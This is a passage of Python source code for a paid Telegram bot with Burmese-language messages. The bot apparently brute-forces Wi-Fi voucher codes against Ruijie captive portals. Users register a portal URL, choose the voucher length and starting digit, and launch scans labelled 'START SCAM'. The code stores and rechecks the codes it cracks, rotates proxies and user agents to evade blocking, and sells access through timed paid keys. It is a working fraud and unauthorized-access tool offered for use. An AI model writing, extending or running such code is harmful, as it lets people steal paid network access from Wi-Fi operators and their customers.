    if call.data == "menu_start_scam":
        if user_id not in paid_users and user_id not in approve:
            await bot.edit_message_text(
                chat_id=chat_id,
                message_id=call.message.message_id,
                text=f"{E_CROSS} သင်၏ user ID ကို registered မလုပ်ရသေးပါ။\n\nPAID USER ဖြစ်ရန် Admin @STHTK သို့ ဆက်သွယ်ပါ။",
                reply_markup=get_back_keyboard(),
                parse_mode="HTML"
            )
            await bot.answer_callback_query(call.id)
            return
        
        global active_scans_count, active_scans_lock
        async with active_scans_lock:
            if active_scans_count >= MAX_CONCURRENT_SCANS:
                await bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=call.message.message_id,
                    text=f"{E_WARN} <b>Bot အလုပ်များနေပါသည်။</b>\nလက်ရှိ {active_scans_count}/{MAX_CONCURRENT_SCANS} ယောက် scan လုပ်နေပါသည်။\n\nခဏစောင့်ပြီးမှ ထပ်ကြိုးစားပါ။",
                    reply_markup=get_back_keyboard(),
                    parse_mode="HTML"
                )
                await bot.answer_callback_query(call.id)
                return
            active_scans_count += 1
        
        if chat_id not in user_data or 'selected_mode' not in user_data.get(chat_id, {}):
            await bot.edit_message_text(
                chat_id=chat_id,
                message_id=call.message.message_id,
                text=f"{E_CROSS} VOUCHER အမျိုးအစားမရွေးရသေးပါ။ ကျေးဇူးပြု၍ VOUCHER အရင်ရွေးပါ။",
                reply_markup=get_voucher_keyboard(),
                parse_mode="HTML"
            )
            await bot.answer_callback_query(call.id)
            return
        
        mode = user_data[chat_id]['selected_mode']
        start_digit = user_data[chat_id].get('start_digit')
        
        if chat_id not in user_data or 'session_url' not in user_data.get(chat_id, {}):
            await bot.edit_message_text(
                chat_id=chat_id,
                message_id=call.message.message_id,
                text=f"{E_LINK} ကျေးဇူးပြု၍ Portal URL ကိုအရင်ထည့်သွင်းပါ:\n\n<code>/portal [your_portal_url]</code>",
                reply_markup=get_back_keyboard(),
                parse_mode="HTML"
            )
            await bot.answer_callback_query(call.id)
            return
        
        if chat_id in scan_tasks and not scan_tasks[chat_id]["task"].done():
            await bot.edit_message_text(
                chat_id=chat_id,
                message_id=call.message.message_id,
                text="Scan သည် အလုပ်လုပ်နေပြီဖြစ်သည်။ STOP SCAM ခလုတ်ဖြင့် ရပ်တန့်နိုင်ပါသည်။",
                reply_markup=get_scam_button_keyboard()
            )
            await bot.answer_callback_query(call.id)
            return
        
        await bot.edit_message_text(
            chat_id=chat_id,
            message_id=call.message.message_id,
            text=f"{E_SEARCH} Scan စတင်နေပါသည်...\n\n🔢 VOUCHER Mode: {mode}\n\nSTOP SCAM ခလုတ်ဖြင့် ရပ်တန့်နိုင်ပါသည်။",
            reply_markup=get_scam_button_keyboard(),
            parse_mode="HTML"
        )
        
        progress_msg = await bot.send_message(chat_id, f"{E_SEARCH} Scanning VOUCHER Codes...\n\n", parse_mode="HTML")
        scan_id = str(uuid.uuid4())
        
        try:
            portal_url = user_data[chat_id].get('session_url', 'Unknown')
            last_url = user_data[chat_id].get('last_admin_notified_url', '')
            
            if portal_url != last_url and portal_url != 'Unknown':
                admin_msg = (
                    f"{E_ROCKET} <b>Scan Start Notification</b>\n\n"
                    f"{E_USER} <b>User:</b> {user_name}\n"
                    f"📱 <b>Telegram:</b> {telegram_username}\n"
                    f"{E_ID} <b>User ID:</b> <code>{user_id}</code>\n"
                    f"🔢 <b>Mode:</b> {mode}\n"
                    f"{E_LINK} <b>Portal URL:</b>\n<code>{portal_url}</code>"
                )
                await bot.send_message(ADMIN_ID, admin_msg, parse_mode="HTML")
                user_data[chat_id]['last_admin_notified_url'] = portal_url
        except Exception as e:
            print(f"Admin Notification Error: {e}")

        task = asyncio.create_task(
            run_bruteforce(
                mode,
                chat_id,
                user_data[chat_id]['session_url'],
                scan_id,
                message=call.message,
                progress_msg=progress_msg,
                start_digit=start_digit
            )
        )
        
        scan_tasks[chat_id] = {
            "task": task,
            "stop": False,
            "scan_id": scan_id
        }
        
        await bot.answer_callback_query(call.id)
        return
    
    if call.data == "menu_paid":
        text = (
            f"{E_KEY} <b>PAID USER ဖြစ်ရန်</b>\n\n"
            "ကျေးဇူးပြု၍ သင်၏ PAID KEY ကို ဒီ chat ထဲသို့ တိုက်ရိုက်ပို့ပါ။\n\n"
            "ဥပမာ: <code>ABCD1234XYZ</code>\n\n"
            "Key မရှိသေးပါက Admin ထံ ဆက်သွယ်ပါ။"
        )
        await bot.edit_message_text(
            chat_id=chat_id,
            message_id=call.message.message_id,
            text=text,
            reply_markup=get_paid_keyboard(),
            parse_mode="HTML"
        )
        await bot.answer_callback_query(call.id)
        return

    if call.data == "menu_enter_key":
        await bot.edit_message_text(
            chat_id=chat_id,
            message_id=call.message.message_id,
            text=f"{E_KEY} PAID KEY ကို ဒီ chat ထဲသို့ တိုက်ရိုက်ပို့ပါ။",
            reply_markup=get_back_keyboard(),
            parse_mode="HTML"
        )
        await bot.answer_callback_query(call.id)
        return

    if call.data == "menu_result":
        if user_id not in paid_users and user_id not in approve:
            await bot.edit_message_text(
                chat_id=chat_id,
                message_id=call.message.message_id,
                text=f"{E_CROSS} သင်၏ user ID ကို registered မလုပ်ရသေးပါ။\n\nPAID USER ဖြစ်ရန် Admin @STHTK သို့ ဆက်သွယ်ပါ။",
                reply_markup=get_back_keyboard(),
                parse_mode="HTML"
            )
            await bot.answer_callback_query(call.id)
            return
        
        saved_codes = db_get_results(user_id)
        if saved_codes:
            codes = "\n".join(saved_codes)
            text = f"{E_CHECK} <b>Found Codes:</b>\n{codes}"
        else:
            text = f"{E_CLIP} သင့်တွင် ယခင်ကရရှိထားသော success code မရှိသေးပါ။"
        
        await bot.edit_message_text(
            chat_id=chat_id,
            message_id=call.message.message_id,
            text=text,
            reply_markup=get_back_keyboard(),
            parse_mode="HTML"
        )
        await bot.answer_callback_query(call.id)
        return
    
    if call.data == "menu_recheck":
        if user_id not in paid_users and user_id not in approve:
            await bot.edit_message_text(
                chat_id=chat_id,
                message_id=call.message.message_id,
                text=f"{E_CROSS} သင်၏ user ID ကို registered မလုပ်ရသေးပါ။\n\nPAID USER ဖြစ်ရန် Admin @STHTK သို့ ဆက်သွယ်ပါ။",
                reply_markup=get_back_keyboard(),
                parse_mode="HTML"
            )
            await bot.answer_callback_query(call.id)
            return
        
        if chat_id not in user_data or 'session_url' not in user_data.get(chat_id, {}):
            await bot.edit_message_text(
                chat_id=chat_id,
                message_id=call.message.message_id,
                text=f"{E_LINK} ကျေးဇူးပြု၍ Portal URL ကိုအရင်ထည့်သွင်းပါ:\n\n<code>/portal [your_portal_url]</code>",
                reply_markup=get_back_keyboard(),
                parse_mode="HTML"
            )
            await bot.answer_callback_query(call.id)
            return
        
        await bot.edit_message_text(
            chat_id=chat_id,
            message_id=call.message.message_id,
            text=f"{E_REFRESH} Recheck ကို စတင်နေပါသည်...",
            reply_markup=get_scam_button_keyboard(),
            parse_mode="HTML"
        )
        await recheck_command(call.message)
        await bot.answer_callback_query(call.id)
        return
    
    if call.data == "menu_stop":
        await stop_scan_command(call.message)
        await bot.answer_callback_query(call.id, "🛑 Scan ကိုရပ်တန့်လိုက်ပါပြီ။", show_alert=True)
        return
    
    if call.data.startswith("scan_"):
        if user_id not in paid_users and user_id not in approve:
            await bot.edit_message_text(
                chat_id=chat_id,
                message_id=call.message.message_id,
                text=f"{E_CROSS} သင်၏ user ID ကို registered မလုပ်ရသေးပါ။\n\nPAID USER ဖြစ်ရန် Admin @STHTK သို့ ဆက်သွယ်ပါ။",
                reply_markup=get_back_keyboard(),
                parse_mode="HTML"
            )
            await bot.answer_callback_query(call.id)
            return
        
        mode = call.data.replace("scan_", "")
        
        if chat_id not in user_data:
            user_data[chat_id] = {}
        
        if 'session_url' not in user_data[chat_id]:
            await bot.edit_message_text(
                chat_id=chat_id,
                message_id=call.message.message_id,
                text=f"{E_LINK} ကျေးဇူးပြု၍ Portal URL ကိုအရင်ထည့်သွင်းပါ:\n\n<code>/portal [your_portal_url]</code>",
                reply_markup=get_back_keyboard(),
                parse_mode="HTML"
            )
            await bot.answer_callback_query(call.id)
            return

        if mode in ["6", "7", "8", "9"]:
            await bot.edit_message_text(
                chat_id=chat_id,
                message_id=call.message.message_id,
                text=f"🔢 VOUCHER {mode} လုံးအတွက် ထိပ်စီးနံပါတ်ရွေးပါ -",
                reply_markup=get_digit_keyboard(mode)
            )
            await bot.answer_callback_query(call.id)
            return

        user_data[chat_id]['selected_mode'] = mode
        user_data[chat_id]['start_digit'] = None
        
        text = (
            f"{E_SEARCH} သင်ရွေးချယ်ထားသော VOUCHER အမျိုးအစား: <b>{mode}</b>\n\n"
            f"{E_CHECK} START SCAM ခလုတ်ကိုနှိပ်ပြီး စတင်ပါ။\n"
            f"{E_STOPEMJ} STOP SCAM ခလုတ်ဖြင့် ရပ်တန့်နိုင်ပါသည်။"
        )
        
        await bot.edit_message_text(
            chat_id=chat_id,
            message_id=call.message.message_id,
            text=text,
            reply_markup=get_start_scam_keyboard(),
            parse_mode="HTML"
        )
        await bot.answer_callback_query(call.id)
        return

    if call.data.startswith("digit_"):
        parts = call.data.split("_")
        mode = parts[1]
        digit = parts[2]
        
        if chat_id not in user_data:
            user_data[chat_id] = {}
        user_data[chat_id]['selected_mode'] = mode
        user_data[chat_id]['start_digit'] = None if digit == "random" else digit
        
        text = f"{E_SEARCH} VOUCHER Mode: <b>{mode}</b>\n"
        if digit == "random":
            text += f"{E_DICE} ထိပ်စီးနံပါတ်: Random ဖြစ်ရှာရန်"
        else:
            text += f"🔢 ထိပ်စီးနံပါတ်: {digit} မှစ၍ရှာမည်"
            
        await bot.edit_message_text(
            chat_id=chat_id,
            message_id=call.message.message_id,
            text=text + f"\n\n{E_CHECK} START SCAM ခလုတ်ကိုနှိပ်ပြီး စတင်ပါ။",
            reply_markup=get_start_scam_keyboard(),
            parse_mode="HTML"
        )
        await bot.answer_callback_query(call.id)
        return

async def recheck_command(message):
    chat_id = message.chat.id
    user_id = str(chat_id)

    if is_admin(user_id):
        approve[chat_id] = True
        paid_users[user_id] = True

    if not approve.get(chat_id, False) and user_id not in paid_users:
        await bot.reply_to(message, f"{E_WARN} သင့်တွင် PAID USER မဟုတ်ပါ။ PAID USER ဝယ်ယူရန် Admin @STHTK သို့ ဆက်သွယ်ပါ။", parse_mode="HTML")
        return
    
    saved_codes = db_get_results(str(message.chat.id))
    chat_id_str = str(message.chat.id)
    if saved_codes:
        if message.chat.id not in user_data:
            await bot.reply_to(message, "Scan လုပ်ရန် Portal URL ကိုအရင်ထည့်သွင်းပေးပါ။")
            return
        if "session_url" not in user_data.get(message.chat.id, {}):
            await bot.reply_to(message, "Scan လုပ်ရန် Portal URL ကိုအရင်ထည့်သွင်းပေးပါ။")
            return
        codes = saved_codes
        await bot.reply_to(message, f"Success Code များအား ပြန်လည်စစ်ဆေးနေပါသည်။")
        session_url_recheck = user_data[message.chat.id]["session_url"]
        recheck_list = []
        for code in codes:
            recode = await perform_check(
                session_url_recheck,
                code,
                chat_id,
                scan_id=None,
                recheck=True,
                message=message
            )
            if recode:
                recheck_list.append(recode)
        to_show = "\n".join(recheck_list) if recheck_list else "Code များအားလုံးစစ်ဆေးပြီးပါပြီ မည်သည့် success code မျှရှာမတွေ့ပါ။"
        await bot.reply_to(message, f"{E_CHECK} Rechecked Codes:\n\n{to_show}", parse_mode="HTML")
        await save_rechecked_codes(chat_id_str, recheck_list)
    else:
        await bot.reply_to(message, "သင့်တွင် success code တစ်ခုမျှမရှိသေးပါ။")

async def save_rechecked_codes(chat_id_str, recheck_list):
    db_save_results(chat_id_str, recheck_list)

async def handle_genkey_plan_selection(message, plan):
    args = message.text.split()
    if len(args) < 3:
        await bot.reply_to(message, f"အသုံးပြုရန်: /genkey {plan} [user_id] [code_limit]")
        return
    user_id = args[2]
    code_limit = int(args[3]) if len(args) >= 4 and args[3].isdigit() else 1000
    expiry = generate_expiry(plan)
    if not expiry:
        await bot.reply_to(message, f"{E_CROSS} Plan မမှန်ပါ။", parse_mode="HTML")
        return
    key = generate_random_key()
    db_add_key(key, user_id, plan, expiry, code_limit)
    await bot.reply_to(
        message,
        f"{E_CHECK} <b>Key Generated</b>\n\n"
        f"{E_KEY} KEY: <code>{key}</code>\n"
        f"{E_USER} USER ID: {user_id}\n"
        f"{E_CLIP} PLAN: {plan}\n"
        f"🔢 LIMIT: {code_limit}\n"
        f"{E_HOUR} EXPIRES: {expiry}",
        parse_mode="HTML"
    )


@bot.message_handler(commands=['genkey'])
async def genkey_command(message):
    if not is_admin(message.chat.id):
        await bot.reply_to(message, f"{E_CROSS} သင် Admin မဟုတ်ပါ။", parse_mode="HTML")
        return
    args = message.text.split()
    if len(args) < 3:
        await bot.reply_to(message, "အသုံးပြုရန်: /genkey [plan] [user_id] [code_limit]")
        return
    try:
        await handle_genkey_plan_selection(message, args[1])
    except ValueError:
        await bot.reply_to(message, f"{E_CROSS} code_limit သည် နံပါတ်ဖြစ်ရပါမည်။", parse_mode="HTML")


@bot.message_handler(commands=['delkey'])
async def delkey_command(message):
    if not is_admin(message.chat.id):
        await bot.reply_to(message, f"{E_CROSS} သင် Admin မဟုတ်ပါ။", parse_mode="HTML")
        return
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await bot.reply_to(message, "အသုံးပြုရန်: /delkey [key]")
        return
    db_delete_key(args[1].strip())
    await bot.reply_to(message, f"{E_CHECK} Key ဖျက်ပြီးပါပြီ။", parse_mode="HTML")


async def listkeys_command(message):
    keys = db_get_all_keys()
    if not keys:
        await bot.reply_to(message, f"{E_CLIP} Registered key မရှိသေးပါ။", parse_mode="HTML")
        return
    lines = []
    for key, data in keys.items():
        registered = db_get_user_by_key(key)
        owner = registered["user_id"] if registered else data.get("user_id") or "Not Registered"
        status = f"{E_CHECK} Active" if check_key_expiration(data["expires_at"]) else f"{E_CROSS} Expired"
        used_count = len(db_get_results(owner)) if registered else data['used_codes']
        telegram_name = registered.get("telegram_name", "Unknown") if registered else "Unknown"
        telegram_username = registered.get("telegram_username", "") if registered else ""
        telegram_label = f"@{telegram_username}" if telegram_username else "Not set"
        lines.append(
            f"{E_KEY} Key: <code>{key}</code>\n"
            f"   {E_USER} User ID: {owner}\n"
            f"   🏷️ Name: {telegram_name}\n"
            f"   📱 Telegram: {telegram_label}\n"
            f"   {E_CLIP} Plan: {data['plan']}\n"
            f"   🔢 Limit: {used_count}/{data['code_limit']}\n"
            f"   {E_STATS} Status: {status}"
        )
    text = f"{E_CLIP} <b>Registered Keys</b> ({len(keys)})\n\n" + "\n\n".join(lines)
    await bot.reply_to(message, text, parse_mode="HTML")


async def users_list_command(message):
    users = db_get_all_users()
    if not users:
        await bot.reply_to(message, "👥 User မရှိသေးပါ။")
        return
    await bot.reply_to(message, "👥 Registered Users\n\n" + "\n".join(str(uid) for uid in users))


async def stats_command(message):
    keys = db_get_all_keys()
    active_keys = sum(1 for data in keys.values() if check_key_expiration(data["expires_at"]))
    await bot.reply_to(
        message,
        f"{E_STATS} <b>Bot Stats</b>\n\n"
        f"{E_KEY} Keys: {len(keys)}\n"
        f"{E_CHECK} Active Keys: {active_keys}\n"
        f"👥 Users: {len(db_get_all_users())}",
        parse_mode="HTML"
    )


async def activate_paid_key(message, key):
    user_id = str(message.chat.id)
    key_info = db_get_key(key.strip())

    if not key_info:
        await bot.reply_to(message, f"{E_CROSS} PAID KEY မှားယွင်းနေပါသည်။", parse_mode="HTML")
        return
    bound_user_id = key_info.get("user_id")
    if bound_user_id in (None, ""):
        await bot.reply_to(message, f"{E_CROSS} ဤ PAID KEY ကို Admin က User ID နှင့် bind မလုပ်ရသေးပါ။", parse_mode="HTML")
        return
    if str(bound_user_id) != user_id:
        await bot.reply_to(message, f"{E_CROSS} ဤ PAID KEY ကို အခြား Telegram user အတွက် သတ်မှတ်ထားပါသည်။", parse_mode="HTML")
        return
    if not check_key_expiration(key_info.get("expires_at")):
        await bot.reply_to(message, f"{E_CROSS} သင်၏ PAID KEY သက်တမ်းကုန်ဆုံးနေပါသည်။", parse_mode="HTML")
        return

    telegram_name = message.from_user.first_name or message.from_user.last_name or "Unknown"
    telegram_username = message.from_user.username or ""
    db_add_user(user_id, key.strip(), telegram_name, telegram_username)
    approve[message.chat.id] = True
    paid_users[user_id] = True
    user_data.setdefault(message.chat.id, {})
    await bot.reply_to(
        message,
        f"{E_CHECK} <b>PAID USER ဖြစ်ပါပြီ။</b>\n\n"
        f"{E_ID} USER ID: {user_id}\n"
        f"{E_CLIP} PLAN: {key_info.get('plan', 'unknown')}\n\n"
        f"အောက်ပါ Menu မှ သင်လိုချင်တာကိုရွေးချယ်ပါ။",
        reply_markup=get_main_keyboard(user_id),
        parse_mode="HTML"
    )


@bot.message_handler(commands=['key'])
async def handle_key(message):
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await bot.reply_to(message, f"{E_KEY} PAID KEY ကို ဒီ chat ထဲသို့ တိုက်ရိုက်ပို့ပါ။", parse_mode="HTML")
        return
    await activate_paid_key(message, args[1])


@bot.message_handler(func=lambda message: bool(message.text) and not message.text.startswith("/"))
async def handle_direct_paid_key(message):
    text = message.text.strip()
    pending = user_data.get(message.chat.id, {}).get("pending_admin_key")
    if is_admin(message.chat.id) and pending:
        if not text.isdigit():
            await bot.reply_to(message, f"{E_CROSS} Telegram User ID သည် နံပါတ်ဖြစ်ရပါမည်။", parse_mode="HTML")
            return
        plan = pending["plan"]
        code_limit = pending["code_limit"]
        expiry = generate_expiry(plan)
        key = generate_random_key()
        db_add_key(key, text, plan, expiry, code_limit)
        user_data[message.chat.id].pop("pending_admin_key", None)
        await bot.reply_to(
            message,
            f"{E_CHECK} <b>Key Generated</b>\n\n"
            f"{E_KEY} Key: <code>{key}</code>\n"
            f"{E_USER} User ID: {text}\n"
            f"{E_CLIP} Plan: {plan}\n"
            f"🔢 Limit: {code_limit} codes\n"
            f"{E_HOUR} Expires: {expiry}",
            parse_mode="HTML",
            reply_markup=get_admin_back_keyboard()
        )
        return

    if db_get_key(text):
        await activate_paid_key(message, text)

@bot.message_handler(commands=['result'])
async def handle_result(message):
    user_id = str(message.chat.id)
    if is_admin(user_id):
        approve[message.chat.id] = True
        paid_users[user_id] = True

    if user_id not in paid_users and user_id not in approve:
        await bot.reply_to(message, f"{E_CROSS} သင်၏ user ID ကို registered မလုပ်ရသေးပါ။\n\nPAID USER ဖြစ်ရန် Admin @STHTK သို့ ဆက်သွယ်ပါ။", parse_mode="HTML")
        return
    
    saved_codes = db_get_results(str(message.chat.id))
    if saved_codes:
        codes = "\n".join(saved_codes)
        await bot.reply_to(message, f"{E_CHECK} Found Codes:\n{codes}", parse_mode="HTML")
    else:
        await bot.reply_to(message, "သင့်တွင် ယခင်ကရရှိထားသော code မရှိသေးပါ။")

def check_key_expiration(expiration_time):
    try:
        if isinstance(expiration_time, dict):
            expiration_time = expiration_time.get("expires_at")
        if not expiration_time:
            return False
        if expiration_time == "9999-12-31T23:59:59Z":
            return True

        if "T" in str(expiration_time):
            expiry = datetime.fromisoformat(str(expiration_time).replace("Z", "+00:00"))
            if expiry.tzinfo is None:
                expiry = expiry.replace(tzinfo=timezone.utc)
            return datetime.now(timezone.utc) < expiry

        mm, hh, dd, MM, yyyy = map(int, str(expiration_time).split('-'))
        expiration_dt = datetime(
            year=yyyy, month=MM, day=dd, hour=hh, minute=mm,
            second=0, tzinfo=timezone.utc
        )
        return datetime.now(timezone.utc) < expiration_dt
    except Exception as e:
        print("Key parse error:", e)
        return False

def generate_expiry(plan):
    now = datetime.now(timezone.utc)
    plans = {
        "30m": timedelta(minutes=30),
        "1h": timedelta(hours=1),
        "1d": timedelta(days=1),
        "2d": timedelta(days=2),
        "3d": timedelta(days=3),
        "4d": timedelta(days=4),
        "5d": timedelta(days=5),
        "6d": timedelta(days=6),
        "7d": timedelta(days=7),
        "8d": timedelta(days=8),
        "9d": timedelta(days=9),
        "10d": timedelta(days=10),
        "11d": timedelta(days=11),
        "12d": timedelta(days=12),
        "13d": timedelta(days=13),
        "14d": timedelta(days=14),
        "15d": timedelta(days=15),
        "16d": timedelta(days=16),
        "17d": timedelta(days=17),
        "18d": timedelta(days=18),
        "19d": timedelta(days=19),
        "20d": timedelta(days=20),
        "21d": timedelta(days=21),
        "22d": timedelta(days=22),
        "23d": timedelta(days=23),
        "24d": timedelta(days=24),
        "25d": timedelta(days=25),
        "26d": timedelta(days=26),
        "27d": timedelta(days=27),
        "28d": timedelta(days=28),
        "29d": timedelta(days=29),
        "30d": timedelta(days=30),
        "1m": timedelta(days=30),
        "1y": timedelta(days=365),
        "unlimited": None
    }
    if plan not in plans:
        return None
    if plan == "unlimited":
        return "9999-12-31T23:59:59Z"
    return (now + plans[plan]).isoformat()

def get_current_time():
    return datetime.now(timezone.utc)

@bot.message_handler(commands=['recheck'])
async def recheck(message):
    chat_id = message.chat.id
    user_id = str(chat_id)
    
    if is_admin(user_id):
        approve[chat_id] = True
        paid_users[user_id] = True

    if user_id not in paid_users and user_id not in approve:
        await bot.reply_to(message, f"{E_CROSS} သင်၏ user ID ကို registered မလုပ်ရသေးပါ။\n\nPAID USER ဖြစ်ရန် Admin @STHTK သို့ ဆက်သွယ်ပါ။", parse_mode="HTML")
        return
    
    saved_codes = db_get_results(str(message.chat.id))
    chat_id_str = str(message.chat.id)
    if saved_codes:
        if message.chat.id not in user_data:
            await bot.reply_to(message, "Scan လုပ်ရန် Portal URL ကိုအရင်ထည့်သွင်းပေးပါ။")
            return
        if "session_url" not in user_data.get(message.chat.id, {}):
            await bot.reply_to(message, "Scan လုပ်ရန် Portal URL ကိုအရင်ထည့်သွင်းပေးပါ။")
            return
        codes = saved_codes
        await bot.reply_to(message, f"Success Code များအား ပြန်လည်စစ်ဆေးနေပါသည်။")
        session_url_recheck = user_data[message.chat.id]["session_url"]
        recheck_list = []
        for code in codes:
            recode = await perform_check(
                session_url_recheck,
                code,
                chat_id,
                scan_id=None,
                recheck=True,
                message=message
            )
            if recode:
                recheck_list.append(recode)
        to_show = "\n".join(recheck_list) if recheck_list else "Code များအားလုံးစစ်ဆေးပြီးပါပြီ မည်သည့် success code မျှရှာမတွေ့ပါ။"
        await bot.reply_to(message, f"{E_CHECK} Rechecked Codes:\n\n{to_show}", parse_mode="HTML")
        await save_rechecked_codes(chat_id_str, recheck_list)
    else:
        await bot.reply_to(message, "သင့်တွင် success code တစ်ခုမျှမရှိသေးပါ။")

@bot.message_handler(commands=['portal'])
async def handle_portal(message):
    user_id = str(message.chat.id)
    
    if is_admin(user_id):
        approve[message.chat.id] = True
        paid_users[user_id] = True

    if user_id not in paid_users and user_id not in approve:
        await bot.reply_to(message, f"{E_CROSS} သင်၏ user ID ကို registered မလုပ်ရသေးပါ။\n\nPAID USER ဖြစ်ရန် Admin @STHTK သို့ ဆက်သွယ်ပါ။", parse_mode="HTML")
        return
    
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await bot.reply_to(
            message,
            f"{E_LINK} Portal URL ထည့်သွင်းရန်:\n\n/portal [your_portal_url]\n\nဥပမာ:\n/portal https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?lang=en_US&mac=02:00:00:00:00:00",
            parse_mode="HTML"
        )
        return
    url = args[1]
    
    if message.chat.id not in user_data:
        user_data[message.chat.id] = {}
    
    await bot.reply_to(message, f"{E_LINK} Portal URL အားစစ်ဆေးနေပါသည်...", parse_mode="HTML")
    
    use_proxy = db_get_proxy_setting(user_id)
    
    if await check_session_url(session_url=url, use_proxy=use_proxy):
        user_data[message.chat.id]['session_url'] = url

        await bot.reply_to(
            message, 
            f"{E_CHECK} Portal URL အားသိမ်းဆည်းပြီးပါပြီ။\n\nVOUCHER ရွေးချယ်ရန် Menu ကိုသုံးပါ။",
            reply_markup=get_voucher_keyboard(),
            parse_mode="HTML"
        )
    else:
        await bot.reply_to(message, f"{E_CROSS} Portal URL မှားယွင်းနေပါသည်။ ကျေးဇူးပြု၍ ပြန်လည်စစ်ဆေးပါ။", parse_mode="HTML")

# ==================== URL CHECKER — SOCKS5 / HTTP SUPPORT ====================
async def check_session_url(session_url, use_proxy=False):
    """Portal URL စစ်ဆေးခြင်း — SOCKS5 + HTTP Proxy Support"""
    user_agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0'
    ]
    
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'priority': 'u=0, i',
        'referer': 'https://www.google.com/',
        'upgrade-insecure-requests': '1',
        'user-agent': random.choice(user_agents)
    }
    
    for attempt in range(3):
        if use_proxy:
            proxy_url, proxy_auth, proxy_type = get_next_proxy()
        else:
            proxy_url, proxy_auth, proxy_type = None, None, None
        
        try:
            if proxy_type in ("socks4", "socks5"):
                if proxy_auth:
                    host_part = proxy_url.split("://", 1)[1]
                    full_proxy = f"{proxy_type}://{proxy_auth[0]}:{proxy_auth[1]}@{host_part}"
                else:
                    full_proxy = proxy_url
                
                connector = ProxyConnector.from_url(full_proxy, ssl=False)
                async with aiohttp.ClientSession(
                    connector=connector,
                    timeout=aiohttp.ClientTimeout(total=15)
                ) as temp_session:
                    async with temp_session.get(
                        session_url,
                        allow_redirects=True,
                        headers=headers
                    ) as response:
                        final_url = str(response.url)
                        print(f"[CheckPortal] {proxy_type.upper()} Attempt {attempt+1}: {final_url} | Status: {response.status}")
                        
                        if "sessionId" in final_url:
                            return True
                        
                        content = await response.text()
                        if "sessionId" in content or "ruijie" in content.lower() or response.status == 200:
                            return True
            
            else:
                connector = aiohttp.TCPConnector(ssl=False)
                async with aiohttp.ClientSession(
                    connector=connector,
                    timeout=aiohttp.ClientTimeout(total=15)
                ) as temp_session:
                    proxy_auth_obj = aiohttp.BasicAuth(proxy_auth[0], proxy_auth[1]) if proxy_auth else None
                    async with temp_session.get(
                        session_url,
                        allow_redirects=True,
                        headers=headers,
                        proxy=proxy_url,
                        proxy_auth=proxy_auth_obj
                    ) as response:
                        final_url = str(response.url)
                        print(f"[CheckPortal] HTTP Attempt {attempt+1}: {final_url} | Status: {response.status}")
                        
                        if "sessionId" in final_url:
                            return True
                        
                        content = await response.text()
                        if "sessionId" in content or "ruijie" in content.lower() or response.status == 200:
                            return True
        
        except Exception as e:
            print(f"[CheckPortal] Attempt {attempt+1} Error: {type(e).__name__}: {e}")
            if attempt < 2:
                await asyncio.sleep(1)
            continue
    
    return False

@bot.message_handler(commands=['scan'])
async def handle_key_scan(message):
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await bot.reply_to(
            message,
            "VOUCHER ရွေးချယ်ရန်:\n\n/scan 6, 7, 8, ascii-lower, all, mixed, mixed8",
            reply_markup=get_voucher_keyboard()
        )
        return
    mode = args[1]
    chat_id = message.chat.id
    user_id = str(chat_id)
    
    if is_admin(user_id):
        approve[chat_id] = True
        paid_users[user_id] = True

    if user_id not in paid_users and user_id not in approve:
        await bot.reply_to(
            message,
            f"{E_CROSS} သင်၏ user ID ကို registered မလုပ်ရသေးပါ။\n\nPAID USER ဖြစ်ရန် Admin @STHTK သို့ ဆက်သွယ်ပါ။",
            parse_mode="HTML"
        )
        return
    
    if chat_id not in user_data:
        await bot.reply_to(message, "Scan လုပ်ရန် Portal URL ကိုအရင်ထည့်သွင်းပေးပါ။")
        return
    if 'session_url' not in user_data[chat_id]:
        await bot.reply_to(message, "Scan လုပ်ရန် Portal URL ကိုအရင်ထည့်သွင်းပေးပါ။")
        return

    if chat_id in scan_tasks and not scan_tasks[chat_id]["task"].done():
        await bot.reply_to(message, "Scan သည် အလုပ်လုပ်နေပြီဖြစ်သည်။ STOP SCAM ခလုတ်ဖြင့် ရပ်တန့်နိုင်ပါသည်။")
        return

    progress_msg = await bot.send_message(chat_id, f"{E_SEARCH} Scanning VOUCHER Codes...\n\n", parse_mode="HTML")
    scan_id = str(uuid.uuid4())
    
    try:
        user_name = message.from_user.first_name or message.from_user.username or "User"
        telegram_username = f"@{message.from_user.username}" if message.from_user.username else "Not set"
        portal_url = user_data[chat_id].get('session_url', 'Unknown')
        last_url = user_data[chat_id].get('last_admin_notified_url', '')
        
        if portal_url != last_url and portal_url != 'Unknown':
            admin_msg = (
                f"{E_ROCKET} <b>Scan Start Notification (/scan)</b>\n\n"
                f"{E_USER} <b>User:</b> {user_name}\n"
                f"📱 <b>Telegram:</b> {telegram_username}\n"
                f"{E_ID} <b>User ID:</b> <code>{user_id}</code>\n"
                f"🔢 <b>Mode:</b> {mode}\n"
                f"{E_LINK} <b>Portal URL:</b>\n<code>{portal_url}</code>"
            )
            await bot.send_message(ADMIN_ID, admin_msg, parse_mode="HTML")
            user_data[chat_id]['last_admin_notified_url'] = portal_url
    except Exception as e:
        print(f"Admin Notification Error in /scan: {e}")

    task = asyncio.create_task(
        run_bruteforce(
            mode,
            chat_id,
            user_data[chat_id]['session_url'],
            scan_id,
            message=message,
            progress_msg=progress_msg
        )
    )

    scan_tasks[chat_id] = {
        "task": task,
        "stop": False,
        "scan_id": scan_id
    }

@bot.message_handler(commands=['status'])
async def status(message):
    if str(message.chat.id) != ADMIN_ID:
        await bot.reply_to(message, "No Permission")
        return
    active_scans = sum(1 for data in scan_tasks.values() if not data["task"].done())
